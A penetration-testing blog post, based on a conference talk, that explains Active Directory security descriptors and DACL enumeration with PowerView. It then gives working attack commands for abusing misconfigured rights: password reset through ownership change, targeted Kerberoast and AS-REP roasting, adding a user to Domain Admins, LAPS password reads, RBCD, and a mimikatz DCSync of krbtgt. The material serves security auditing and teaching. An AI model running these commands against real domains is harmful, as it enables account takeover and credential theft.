---
title: Understanding Active Directory Security Descriptors
date: 2024-06-02
categories:
  - Windows
tags:
toc: "true"
---
Security Descriptors provide a way to configure access relationships between objects. More often than we would like, administrators configure too many permissions, opening new attack paths. In other cases, the legitimate solutions to resolve a certain problem require an account to have high privileges (Exchenge, AD Connect, ...). This type of overpemisions may lead to privilege escalation and persistence opportunities. 

In this blog post we will dive into what are Security Descriptors, which security risks may arise if are not properly configured (and even if they are) and how from an attacker's perspective we can take advantage from it. 

This post are the notes taken from the Daniel Lopez (@attl4s) YouTube [Presentation](https://attl4s.github.io/assets/pdf/Understanding_Active_Directory_Security_Descriptors.pdf) and [Recording](https://www.youtube.com/watch?v=F-aeOLQd6E4). This talk is only in Spanish. Check his RRSS out, he has really great talks about all the Windows security research and environment.

## Security Descriptors

A security descriptor in Windows is a data structure that contains security information associated with a securable object. The objects that can have a Security Descriptor are called [Securable Objects](https://learn.microsoft.com/en-us/windows/win32/secauthz/securable-objects). A security descriptor can include the following elements:

- **Object Owner (SID):** The `SecurityIdentifier` (SID) is a unique value used to identify a user, group, or computer account within a Windows environment. The owner of the object is identified by a Security Identifier (SID). Has the ability to change the permissions on the object and assign ownership to someone else.
- **Discretionary Access Control List (DACL):** Defines the permissions that users and groups have on an object. It consists of Access Control Entries (ACEs), each specifying the permissions for a particular user or group. For example, an ACE might grant read and write permissions to a specific user while denying execute permissions to another user.
- **System Access Control List (SACL):** Used for auditing purposes. It specifies which operations by which users should be logged. For instance, you might configure the SACL to log all failed attempts to read a file, which helps in identifying potential security breaches.
- **Set of Control Bits**: Flags that define attributes of the security descriptor and its components. They include information such as whether the DACL or SACL is present, whether the DACL or SACL is defaulted or whether the security descriptor is self-relative  (meaning all its pointers are offsets within the descriptor)

From the attacker point of view the most interesting attributes of a file descriptor are the **SID** and the **DACL** . Being the owner or controlling the object ownership or having rights to control/modify its DACL may mean that we have object-specific rights to compromise it. 

Now lets jump to the first part of this attack chain, enumerate and understand ACLs. 

## ACL Enumeration
When auditing Active Directory environments, looking manually for Access Control Lists (ACLs) configurations can be time consuming. Here are some tips to not waste time when enumerating ACLs:
### Focusing on Key Objects
When manually auditing an AD environment, it is crucial to prioritize your efforts on the most significant objects to maximize the impact of your audit:

- **Domains**: Start with the domain object itself. This object has overarching control and contains configurations that impact the entire domain.
- **Specific Groups**: Key groups such as Domain Admins, Enterprise Admins, and any custom groups with elevated privileges. These groups often hold critical permissions.
- **Computers**: Especially focus on critical servers like domain controllers, file servers, and database servers which hold valuable and sensitive information.
- **Users**: Focus on users with administrative privileges, service accounts, and any users with broad or sensitive access.

### Comprehensive DACL Review
Understanding the security posture requires a comprehensive review of DACLs (Discretionary Access Control Lists) for all important objects. DACLs define who can access or modify the object and how they can do so. Here are some visual tools that can help with this task:

- **BloodHound**: A powerful tool for mapping out permissions and relationships within AD. BloodHound can automatically collect and analyze data, presenting it in an easy-to-understand graphical format. This helps in identifying paths to privilege escalation and understanding complex permission structures.
- **PowerView’s Invoke-ACLScanner**: This PowerShell cmdlet from the PowerView toolset scans and reports on ACLs across AD objects. It helps in identifying where users or groups have unexpected or overly permissive rights, aiding in the discovery of potential security issues.

### Filtering Out Noise
When analyzing ACLs, you need to filter out noise to focus on relevant data:

- **Filter Out Well-Known SIDs**: Skip over SIDs for known privileged accounts like Domain Admins (`S-1-5-<domain>-512`). These are expected to have broad permissions.
- **SID > 1000**: This heuristic helps in identifying user and group accounts created within the domain as opposed to default system accounts. In Windows, SIDs with a RID (Relative Identifier) greater than 1000 generally correspond to regular user accounts and custom groups rather than built-in or default accounts.

### Enumerating with PowerView
Let's walk through an example of how to enumerate **DACLs (Discretionary Access Control Lists)** on a specific Active Directory object using PowerView. We'll use the `Get-DomainObjectAcl` command from PowerView suite and then convert the SIDs to their corresponding user or group names.

First, ensure that you have PowerView loaded in your PowerShell session. You can typically load it from a PowerShell script containing PowerView functions. Then we can use the following command:
```powershell
Get-DomainObjectAcl [OBJECT] |? { ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$')} | select SecurityIdentifier, ActiveDirectoryRights, @{Name='Whois'; Expression={Convert-SIDToName $_.SecurityIdentifier}}
```

This command retrieves all modified DACLs for the specified Active Directory object since the AD environment was created. The `Whois` column shows who has the listed rights over the specified object, and the `ActiveDirectoryRights` column indicates the permissions they have over it.

The output returned may seem to something like this:
```powershell
PS C:\> Get-DomainObjectAcl vegeta_sa |? { ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$')} | select SecurityIdentifier, ActiveDirectoryRights, @{Name='Whois'; Expression={Convert-SIDToName $_.SecurityIdentifier}}

SecurityIdentifier                 ActiveDirectoryRights        Whois
------------------                 ---------------------        -----
S-1-5-21-3623811015-3361044348-30300820-1121  ReadProperty, WriteProperty   Jane.Doe
S-1-5-21-3623811015-3361044348-30300820-1122  GenericAll                    John.Admin
S-1-5-21-3623811015-3361044348-30300820-1123  WriteDacl                     Domain Admins
S-1-5-21-3623811015-3361044348-30300820-1124  ReadProperty                  Backup Operators
```

In the example `John.Admin` has `GenericAll` rights over `vegeta_sa`. 

#### List Domain Computers DACL
If we want to list the specific permissions (DACLs) associated with all the computer objects in the Active Directory domain, we just need to add `Get-DomainComputer` and a pipeline before the previous command: 
```powershell
PS C:\> Get-DomainComputer | Get-DomainObjectAcl | ? { ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$')} | select SecurityIdentifier, ActiveDirectoryRights, @{Name='Whois'; Expression={Convert-SIDToName $_.SecurityIdentifier}}

ComputerName    SecurityIdentifier                 ActiveDirectoryRights        Whois
------------    ------------------                 ---------------------        -----
PC-01           S-1-5-21-3623811015-3361044348-30300820-1121  ReadProperty, WriteProperty   Jane.Doe
PC-01           S-1-5-21-3623811015-3361044348-30300820-1122  GenericAll                    John.Admin
PC-02           S-1-5-21-3623811015-3361044348-30300820-1123  WriteDacl                     Domain Admins
PC-02           S-1-5-21-3623811015-3361044348-30300820-1124  ReadProperty 
```

#### List Domain Users DACL
The same can be done with `Get-DomainUser`:
```powershell
PS C:\> Get-DomainUsers | Get-DomainObjectAcl | ? { ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$')} | select SecurityIdentifier, ActiveDirectoryRights, @{Name='Whois'; Expression={Convert-SIDToName $_.SecurityIdentifier}}

Username       SecurityIdentifier                 ActiveDirectoryRights        Whois
--------       ------------------                 ---------------------        -----
jdoe           S-1-5-21-3623811015-3361044348-30300820-1121  ReadProperty, WriteProperty   Jane.Doe
jdoe           S-1-5-21-3623811015-3361044348-30300820-1122  GenericAll                    John.Admin
asmith         S-1-5-21-3623811015-3361044348-30300820-1123  WriteDacl                     Domain Admins
asmith         S-1-5-21-3623811015-3361044348-30300820-1124  ReadProperty       
```

### Enumerating with AD Module

When utilizing the ActiveDirectory module, it allows navigation to directories by accessing `AD:\`. This facilitates the exploration of various Active Directory (AD) features, including the ability to list discretionary access control lists (DACLs) of AD users.

The following PowerShell command demonstrates how to enumerate these DACLs:
```powershell
(Get-Acl "AD:$(Get-ADUser [OBJECT])").Access | ? { ((Convert-NameToSid $_.IdentityReference) -match '^S-1-5-.*-[1-9]\d{3,}$')}
```

However, there's a drawback: the ActiveDirectory module automatically converts the Security Identifier (SID) into its corresponding name, which means we can't effectively filter those SID over 1000.

## Extended Rights
Extended rights refer to additional permissions beyond the standard set of permissions granted to users or groups. These provide more granular control over specific actions or operations within the directory service.

Extended rights might include permissions to resetting passwords, modifying schema objects, or managing group memberships. These rights are often necessary for performing administrative tasks or configuring specialized access control scenarios.

### Enumerating Extended Rights
There are a lot of different extended rights. To differentiate them we need to retrieve the `ObjectAceType` from the same DACL. How do we do so? Modifying the previous PowerView command and add the `ObjectAceType` property to be listed: 

```powershell
Get-DomainObjectAcl [OBJECT] |? { ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$')} | select SecurityIdentifier, ActiveDirectoryRights, @{Name='Whois'; Expression={Convert-SIDToName $_.SecurityIdentifier}}, ObjectAceType
```

Then we just need to Google that specific `ObjectAceType` to know exactly what right is being applied. There are tools such as BloodHound that already makes this conversion. 

### Right Categories
rights are often classified into three broad categories: generic rights, control rights, and object-specific rights: 

1. **Generic Rights**: Fundamental permissions that apply across various objects and operations within Active Directory. They include basic actions such as reading, writing, creating, deleting, and modifying objects. Generic rights are foundational to access control and apply broadly across the directory structure. This are GenericRight and GenericRead. 
    
2. **Control Rights**: Administrative capabilities and management functions within Active Directory. These rights enable users or groups to perform tasks related to directory configuration, schema management, replication, and domain-level operations. Control rights allows controlling object by modifying their ownerships or DACLs. This are WriteDacl and WriteOwner. 
    
3. **Object-Specific Rights**: Tailored to the properties, attributes, or behaviors of individual objects within Active Directory. These rights define specific actions that can be performed on particular objects, such as user accounts, groups, or organizational units. Examples include permissions to modify specific attributes, reset passwords, or delegate administrative authority over specific objects. Those are ResetPassword and WriteMSDS-PrincipalName, WriteUserAccountControl, etc. 

There are a lot of possible attacks regarding having certain rights over Objects. Think about having General Rights over a computer; you may be able to change the configuration of it. Or maybe setup a start-up script when any user logs in. 

### Exploiting Control Rights
Let's walk through a scenario where we've compromised User1's account. After gaining access, we examine the permissions of User2 and discover that User1 has the `WriteOwner` permission over User2.

In this situation, we can leverage a PowerView command called `Set-DomainObjectOwner`. This command allows us to change the ownership of a specified domain object within the Active Directory environment. By using this command, User1 can alter the ownership of User2's object, effectively becoming its owner. 

Changing the owner of an object grants significant control, potentially enabling the manipulation of User2's entire discretionary access control list (DACL).

With this authority, User1 can then proceed to grant themselves additional permissions, such as the `ChangePassword` extended right, effectively taking control of User2's account. Here's how the process unfolds:
```powershell
PS C:\> Set-DomainObjectOwner -Identity User2 -OwnerIdentity User1 -Verbose
PS C:\> Add-DomainObjectAcl -TargetIdentity User2 -Rights Resetpassword -PrincipalIdentity User1
PS C:\> net user User2 password /domain 
```

If User1 had `WritePermissions` instead of `WriteOwner`, they could skip the first command and proceed directly to granting themselves additional permissions on User2's account.

> **Note**
> PowerView has limied `Rights` options. To user other the the one's supported use `RightsGUID` and provide the `ObjectAceType` mentioned before. 

### Exploiting Object-Specific Rights on Users
There are may attacks that can be perform  depending on the organization architecture and many others that are not even discovered yet, but here are the most famous ones:

| Attack Type    | Required Right               |
|----------------|------------------------------|
| Change password| ResetPassword                |
| Kerberoast     | WriteMsDs-PrincipalName      |
| AS-REP Roast   | WriteUserAccountControl      |

Since the first one have been already explained we will focus on the rest:
#### Kerberoast
Assume an scenario where we have the `WriteMsDs-PrincipalName` right over User3. What we could do is to set an arbitrary SPN to User3, perform Kerberoast attack and then wipe out that right again: 
```powershell
PS C:\> Set-DomainObject -Identity User3 -SET @{serviceprincipalname='Arbitrary/SPN'} -Verbose
PS C:\> Invoke-Kerberoast User3
PS C:\> Set-DomainObject -Identity User3 -Clear serviceprincipalname -Verbose 
```
#### AS-REP Roast
Assume an scenario where we have the `WriteUserAccountControl` right over User4. What we could do is to change the account configuration to not require pre-authentication to User4, perform AS-REP Roast attack and then wipe out that right again: 
```powershell
PS C:\> Set-ADAccountControl -Identity User4 -DoesNotRequirePreAuth $true -Verbose
PS C:\> ./Rubeus.exe asreproast /user:User4
PS C:\> Set-ADAccountControl -Identity User4 -DoesNotRequirePreAuth $false -Verbose 
```

### Exploiting Object-Specific Rights on Groups
As it was mentioned before, some objects have certain right that others do not have. This is the case for Groups. The only thing that we can do with groups is to add new members to it, but this can be achieved using three different rights: 

- Write Managed By
- Add/remove self as member 
- Write members

This can be achieved with the following command: 
```powershell
PS C:\> net group "Domain Admins" User1 /add /domain 
```

### Exploiting Object-Specific Rights on Workstations
The most interesting thing that can be done are the following:

 1. If LAPS is installed in the workstation, an attacker may be able to Read the Administrator password having the `Read ms-Mcs-AdmPwd` right.
```powershell
PS C:\> Get-DomainComputer dt* -Properties name,ms-mcs-admpwd
```

 2. Setting Kerberos RBCD having the `Write msDS-AllowedtoActOnBehalfofOtherIdentity` right.
```powershell
PS C:\> Set-ADComputer -Identity Paw01$ -PrincipalsAllowedToDelegateToAccount WS01$
```
 
### Exploiting Object-Specific Rights on Domains
The most interesting thing that can be done is DC-Sync attack. This attack consist on faking a Second Domain Controller and make the real Domain to replicate the Data into our fake one. This functionality is intended to achieve availability creating AD backups and so on. To perform such attack it might be needed `Replicating Directory Changes` or `Replicating Directory Changes All` rights. Here we obtain a golden ticket with dcsync attack with mimikatz:
```cmd
mimikatz# lsadump::dcsync /user:krbtgt
```

## References 
The main reference for this topic (as stated in Attl4s video) is this security research.

**Main Reference**
- Sildes: https://www.blackhat.com/docs/us-17/wednesday/us-17-Robbins-An-ACE-Up-The-Sleeve-Designing-Active-Directory-DACL-Backdoors.pdf
- Paper: https://specterops.io/wp-content/uploads/sites/3/2022/06/an_ace_up_the_sleeve.pdf
- Video: https://www.youtube.com/watch?v=_XaPMyvdFDo&ab_channel=SecurityTalks.com

**Other good references**
- [# DEF CON 25 - Andy Robbins, Will Schroeder - Designing Active Directory DACL Backdoors](https://www.youtube.com/watch?v=_nGpZ1ydzS8)
- [thehackerrecipes - DACL](https://www.thehacker.recipes/ad/movement/dacl) <- Very good attack mindmap 

## Further Investigation

There are other interesting attacks regarding GPOs and OUs. I couldn't dig in as much I would like, at least not enough to explain them extendedly. I left here some of the references @Attl4s mentioned in the video. Most of the reference were broken, but I found some searching a little bit on Internet. 

**Exploiting Object-Specific Rights on GPOs**
- https://blog.harmj0y.net/redteaming/abusing-gpo-permissions/
- https://wald0.com/?p=179

**Object-Specific Rights on OUs**
- https://markgamache.blogspot.com/2020/07/exploiting-ad-gplink-for-good-or-evil.html